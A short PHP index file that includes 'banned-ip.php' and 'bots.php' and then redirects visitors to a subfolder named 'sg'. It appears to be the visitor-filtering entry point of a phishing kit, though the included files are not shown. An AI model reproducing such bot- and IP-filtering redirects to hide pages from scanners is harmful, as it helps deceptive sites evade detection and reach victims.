<?php 
include 'banned-ip.php';
include 'bots.php';


$src="sg";
header("location:$src");
?>